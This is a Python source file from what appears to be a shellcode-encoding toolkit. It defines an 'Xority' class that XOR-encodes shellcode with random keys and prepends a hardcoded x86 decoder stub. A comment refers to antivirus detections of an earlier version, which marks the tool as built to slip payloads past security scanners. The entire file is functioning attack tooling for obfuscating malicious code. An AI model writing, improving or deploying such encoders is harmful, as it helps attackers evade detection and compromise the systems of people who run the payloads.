import struct
import textwrap
import secrets
import logging

from shellerate.encoder.encoder import Encoder
from binascii import unhexlify, hexlify;
from shellerate.utils import strings;

# First version with clear text decoder stub: https://www.virustotal.com/#/file/7b25b33a1527d2285ebdefd327bc72b6d932c140489e8bfb7424bef115aa2ecd/detection

class Xority(Encoder):
  def __init__(self, shellcode):
    super(Xority, self).__init__(shellcode)
    self.debug=True;
  
  # val is the hex representation of the register without 0x
  # calc_xor_key("d2b00bcd") -> 62bbc61f
  def calc_xor_key(self, val):
    key = ""
    a=strings.split(val)
    b=[]

    b.append(self.xor_str(a[0], secrets.token_hex(1)))
    b.append(self.xor_str(a[1], secrets.token_hex(1)))
    b.append(self.xor_str(a[2], secrets.token_hex(1)))
    b.append(self.xor_str(a[3], secrets.token_hex(1)))
    
    return ''.join(b)

  def encode(self, output_format="c"):
    padded_shellcode = strings.pad(self.shellcode())
    output = ""
    for c in textwrap.wrap(padded_shellcode, 16):
      val=strings.from_char_to_hexcode(c)
      key=self.calc_xor_key(val)
      encoded=self.xor_str(val, key)

      logging.debug("V: %s" %val)
      logging.debug("K: %s" %key.zfill(8))
      logging.debug("E: %s" %encoded.zfill(8))

      output+=key.zfill(8)
      output+=encoded.zfill(8)



    mark=secrets.token_hex(4)
    output+=mark
    output+=mark
    a=strings.split(output)

    if output_format == "c":
      return ''.join('\\x'+x.zfill(2) for x in a)
    if output_format == "asm":
      o = ''.join('0x'+x.zfill(2)+', ' for x in a)
    if output_format == "raw":
      return ''.join(x.zfill(2) for x in a)

    return o[:-2]

  def payload(self, output_format="c"):
    stub_raw = "eb225e8d3e31c031db31c931d28b1c0604048b140631d339cb740e891f83c7040404ebe9e8d9ffffff"
    if output_format == "raw":
      return stub_raw + self.encode("raw")
    
    a=strings.split(stub_raw)
    if output_format == "c":
      stub=''.join('\\x'+x.zfill(2) for x in a)
    if output_format == "asm":
      stub = ''.join('0x'+x.zfill(2)+', ' for x in a)

    return stub +self.encode(output_format)


